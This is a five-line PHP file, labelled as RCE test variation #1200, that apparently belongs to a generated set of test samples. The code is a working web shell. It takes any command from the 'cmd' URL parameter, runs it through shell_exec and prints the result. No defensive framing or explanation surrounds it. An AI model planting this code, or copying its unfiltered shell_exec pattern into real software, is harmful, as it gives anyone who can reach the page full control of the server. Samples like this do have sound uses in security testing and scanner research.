<?php
// RCE test variation #1200
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>